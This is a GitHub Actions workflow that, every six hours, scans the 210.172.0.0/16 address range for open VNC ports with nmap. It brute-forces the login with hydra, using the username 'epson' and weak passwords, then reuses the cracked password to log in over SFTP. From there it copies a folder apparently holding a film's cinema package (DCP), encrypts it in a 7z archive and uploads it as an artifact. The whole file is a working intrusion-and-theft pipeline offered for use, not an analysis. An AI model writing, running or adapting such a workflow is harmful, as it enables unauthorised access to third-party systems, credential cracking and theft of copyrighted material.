name: Demon Slayer Infinity Castle â€“ DCP Hunter

on:
  schedule:
    - cron: '0 */6 * * *'   # every 6 hours
  workflow_dispatch:

jobs:
  hunt:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    runs-on: ${{ matrix.os }}

    steps:
      - name: Install Linux tools
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full

      - name: Install Windows tools
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          choco install nmap rclone 7zip hydra -y --no-progress
          Set-Content -NoNewline -Path "$env:SystemDrive\hydra_passwords.txt" `
            -Value "epson`nadmin`nprojector`n123456"

      - name: Scan for open VNC
        id: scan
        shell: bash
        run: |
          if [ "$RUNNER_OS" == "Linux" ]; then
            nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
          else
            nmap -p5900 --open 210.172.0.0/16 -oG vnc.txt
            grep "5900/open" vnc.txt | awk '{print $2}' > vnc_hosts.txt
          fi
          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
        env:
          RUNNER_OS: ${{ runner.os }}

      - name: Brute VNC passwords
        if: steps.scan.outputs.vnc_count != '0'
        shell: bash
        run: |
          PASSWORD_FILE=$([ "$RUNNER_OS" == "Linux" ] && echo "/usr/share/wordlists/fasttrack.txt" || echo "/c/hydra_passwords.txt")
          while read ip; do
            hydra -l epson -P "$PASSWORD_FILE" vnc://$ip -t 4 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt
        env:
          RUNNER_OS: ${{ runner.os }}

      - name: Check for valid IPs
        id: valid
        shell: bash
        run: |
          echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT

      - name: Download DCP if found
        id: dcp
        if: steps.valid.outputs.found == 'true'
        shell: bash
        run: |
          mkdir -p staging
          while read ip; do
              PASS=$(grep -oP '(?<=password: ).*' hydra_$ip.txt | head -n1)
              rclone config create relay$ip sftp \
                host=$ip user=epson port=22 pass="$PASS"
              rclone lsf relay$ip:/ | grep -iq dsic && {
                rclone copy relay$ip:/DSIC_P1 staging/DSIC_P1 -P --transfers=32
                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
                echo "movie_found=true" >> $GITHUB_OUTPUT
                break
              }
          done < valid_ips.txt

      - name: Upload artifact
        if: steps.dcp.outputs.movie_found == 'true'
        uses: actions/upload-artifact@v4
        with:
          name: DSIC_P1_${{ matrix.os }}
          path: DSIC_P1.7z
          retention-days: 7

      - name: Signal success
        if: steps.dcp.outputs.movie_found == 'true'
        run: echo "movie found and downloaded"
